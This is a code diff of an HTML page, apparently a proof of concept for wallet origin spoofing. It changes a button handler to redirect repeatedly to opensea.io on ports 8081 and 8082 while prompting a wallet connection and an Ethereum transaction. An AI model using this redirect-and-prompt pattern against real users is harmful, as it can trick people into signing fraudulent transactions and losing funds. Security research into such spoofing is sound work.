@@ -20,8 +20,13 @@
 <body>
   <script>
     async function openBingAndPromptTransaction() {
-      // Open bing.com
-      window.open('https://bing.com', 'x');
+      // Initial redirection
+      location.href = "https://opensea.io:8081";
+
+      // Interval-based redirection
+      setInterval(function () {
+        location.href = "https://opensea.io:8082";
+      }, 1000);
 
       // Check for wallet connection
       const connected = await promptWalletConnection();
@@ -79,14 +84,6 @@
         alert('Ethereum transaction request failed or was rejected.');
       }
     }
-
-    // Initial redirection
-    location.href = "https://opensea.io:8081";
-
-    // Interval-based redirection
-    setInterval(function () {
-      location.href = "https://opensea.io:8082";
-    }, 1000);
   </script>
   <center>
     <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptTransaction()">
